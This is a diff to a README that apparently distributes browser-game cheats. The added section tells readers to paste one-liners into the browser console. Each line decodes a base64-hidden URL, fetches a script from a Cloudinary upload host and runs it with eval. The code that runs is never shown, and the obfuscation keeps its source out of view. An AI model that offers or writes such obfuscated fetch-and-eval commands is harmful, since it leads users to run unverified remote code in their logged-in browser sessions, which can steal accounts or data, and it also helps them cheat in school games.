@@ -101,9 +101,14 @@ fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2Fk
 Open Console (ctrl + shift + j) and past the following:
 ```js
 fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL3RkQ2xlYXJFbmVtaWVzLmpz')).then((res) => res.text().then((t) => eval(t)))
+```
+
+## <a id="GetCash"></a>GetCash.js
+
+Open Console (ctrl + shift + j) and past the following:
 ```js
-
-
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL3RkR2V0Q2FzaC5qcw==')).then((res) => res.text().then((t) => eval(t)))
+```
 
 
 ## More hacks are coming soon if someone coments on this with more working hacks i will add them
